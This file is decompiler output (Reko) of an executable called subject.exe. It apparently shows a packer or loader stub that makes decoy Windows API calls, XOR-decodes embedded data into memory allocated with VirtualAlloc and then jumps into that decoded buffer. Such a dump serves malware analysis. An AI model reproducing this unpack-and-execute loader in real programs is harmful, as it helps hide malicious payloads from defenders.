// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 1310D000: void fn1310D000(Stack (ptr byte) dwArg04, Stack ptr32 dwArg08, Stack Eq_4 dwArg0C, Stack (ptr Eq_4) dwArg10, Stack ui32 dwArg14, Stack Eq_7 dwArg18)
void fn1310D000(byte * dwArg04, ptr32 dwArg08, HANDLE dwArg0C, HANDLE * dwArg10, ui32 dwArg14, Eq_7 dwArg18)
{
	*dwArg10 = (HANDLE *) dwArg0C;
	CreateFileA(0x00, 0x00, 0x00, null, 0x00, 0x00, null);
	SleepEx(0x00, 0x00);
	union Eq_35 * dwArg08_169 = dwArg08 + dwArg14;
	do
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == null)
			return;
		ui32 ebx_138 = DPB(dwLoc1D, (byte) *dwArg08_169, 0) ^ *((word32) dwArg18.u0 + (word32) wLoc1C) & 0xFF;
		*dwArg04 = (byte) ebx_138;
		wLoc1C = (word16) ((word32) SLICE(ebx_138, word16, 8) + 0x01);
		dwLoc1D = ebx_138;
		if ((int32) wLoc1C == 0x05)
			wLoc1C = 0x00;
		byte * ecx_161 = dwArg04 + 0x01;
		if (ecx_161 == (byte *) 0x29)
			return;
		union Eq_35 * ebx_168 = (char *) dwArg08_169 + 0x01;
		dwArg04 = ecx_161;
		dwArg08_169 = ebx_168;
	} while (ebx_168 != (union Eq_35 *) 0xBE000000);
}

// 1310D0E5: void fn1310D0E5(Register word32 ebp)
void fn1310D0E5(word32 ebp)
{
	ContinueDebugEvent(0x00, 0x00, 0x00);
	GetLastError();
	LookupPrivilegeValueA(0x00, 0x00, fp - 0x02C4);
	ptr32 esp_119 = fp - 0x02F0;
	if (false)
	{
		Eq_31 eax_316 = WriteProfileSectionW(null, null);
		word32 v13_323 = eax_316 + 0xFFF5 ^ ((eax_316 ^ 0x13101FF6) ^ 0x01);
		word32 esi_328 = v13_323->dw0000;
		fn1310D000(fp - 0x023C, fp - 0x023C, (void *) 0x04, fp - 0x10, fp - 0x0234 ^ fp - 0x0234, fp - 0x0234);
		Eq_4 edi_368 = fp - 0x10 ^ fp - 0x10;
		word32 v17_373 = Mem0[v13_323 + 0x04:word32] + (WaitForSingleObject(edi_368, 0x54000000) + 0x01);
		fn1310D000(fp - 600, fp - 0x025C, edi_368, (HANDLE *) 0x54000000, 0x04, fp - 0x10);
		ui32 edi_385 = v13_323->dw0008;
		fn1310D000(fp - 0x14, fp - 0x1C, (void *) 0x04, fp - 0x10, 0x08, fp - 0x0234);
		word32 ecx_416 = v13_323->dw000C;
		fn1310D000(fp - 0x1C, fp - 0x28, (void *) 0x04, fp - 0x10, 0x0C, fp - 0x0234);
		CreateFileW(null, 0x00, 0x00, null, 0x00, 0x00, (void *) 0x04);
		dwLoc0248 = v13_323->t0010;
		fn1310D000(fp - 0x0248, fp - 600, (void *) 0x04, fp - 0x10, 0x10, fp - 0x0234);
		WritePrivateProfileStringA(0x00, 0x38000000, 0x00, 0x00);
		Eq_222 ebx_490 = edi_385 * 0x08 + 0x0C;
		dwLoc023C = esi_328;
		dwLoc0258 = v17_373;
		dwLoc14 = edi_385;
		dwLoc024C = 0x14;
		dwLoc24 = (word32 *) ((char *) &v13_323->t0010 + 0x04);
		dwLoc2C = ebx_490;
		esp_119 = fp - 0x0338;
		dwLoc0260 = VirtualAlloc(eax_316 - 0x01, ebx_490 + v17_373 + esi_328, 0x00, 0x38000000);
		dwLoc0C = (char *) ebx_490 + (ecx_416 + 0x13100000);
		dwLoc0264 = ebx_490;
		dwLoc08 = 0x00;
		dwLoc18 = null;
	}
	while (0x01 != 0x00)
	{
		union Eq_13 * esp_196 = esp_119 - 0x04;
		*esp_196 = 0x00;
		*(esp_196 - 0x04) = 0x00;
		*(esp_196 - 0x08) = 0x00;
		WritePrivateProfileSectionA(*(esp_196 - 0x08), *(esp_196 - 0x04), *esp_196);
		esp_119 = esp_196 - 0x08;
		if (dwLoc0264 == dwLoc0248)
		{
			ui32 ecx_235 = dwLoc08 + 0x01;
			dwLoc08 = ecx_235;
			if (ecx_235 == dwLoc14)
				break;
			word32 ebx_241 = *dwLoc24;
			*(esp_196 - 0x0C) = fp - 0x0234;
			*(esp_196 - 0x10) = dwLoc024C;
			*(esp_196 - 0x14) = fp - 0x10;
			*(esp_196 - 0x18) = 0x04;
			*(esp_196 - 0x1C) = fp - 0x1C - dwLoc024C;
			*(esp_196 - 0x20) = fp - 0x1C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			LPVOID * eax_270 = dwLoc24 + 0x01;
			dwLoc0248 = (Eq_222) *eax_270;
			*(esp_196 - 0x0C) = fp - 0x0234;
			ui32 esi_267 = dwLoc024C + 0x04;
			*(esp_196 - 0x10) = esi_267;
			*(esp_196 - 0x14) = fp - 0x10;
			*(esp_196 - 0x18) = 0x04;
			*(esp_196 - 0x1C) = fp - 0x0248 - esi_267;
			*(esp_196 - 0x20) = fp - 0x0248;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc024C = esi_267 + 0x04;
			dwLoc24 = (word32 *) ((char *) eax_270 + 0x04);
			dwLoc0264 = null;
			dwLoc0C = ebx_241 + 0x13100000;
		}
		Mem220[dwLoc0260 + dwLoc18:byte] = Mem201[dwLoc0C + 0x00:byte];
		esp_119 = esp_119 - 0x0C;
		dwLoc0C = dwLoc0C + 0x01;
		dwLoc18 = dwLoc18 + 0x01;
		dwLoc0264 = (Eq_222) ((char *) dwLoc0264 + 0x01);
	}
	ptr32 * esp_127 = esp_119 - 0x04;
	*esp_127 = fp - 0x0234;
	*(esp_127 - 0x04) = (LPVOID *) dwLoc2C;
	*(esp_127 - 0x08) = fp - 0x0238;
	*(esp_127 - 0x0C) = (LPVOID *) dwLoc0258;
	*(esp_127 - 0x10) = (LPVOID *) (dwLoc0260 - dwLoc2C);
	*(esp_127 - 0x14) = (union Eq_265 *) dwLoc0260;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*esp_127 = fp;
	*(esp_127 - 0x04) = fp - 0x0234;
	*(esp_127 - 0x08) = (LPVOID *) dwLoc0258;
	*(esp_127 - 0x0C) = dwLoc023C;
	*(esp_127 - 0x10) = (union Eq_265 *) dwLoc0260;
	word32 ecx_174 = dwLoc0260 + dwLoc0258;
	*(esp_127 - 0x14) = (LPVOID *) ecx_174;
	ptr32 esp_178;
	word32 ebp_179;
	byte SCZO_180;
	word32 eax_181;
	word32 esi_182;
	byte SZO_183;
	byte C_184;
	byte Z_185;
	word32 ecx_186;
	word32 edi_187;
	word32 ebx_188;
	byte dl_189;
	(dwLoc0260 + 5056)();
	*(esp_178 - 0x04) = 0x00;
	ExitProcess(*(esp_178 - 0x04));
}

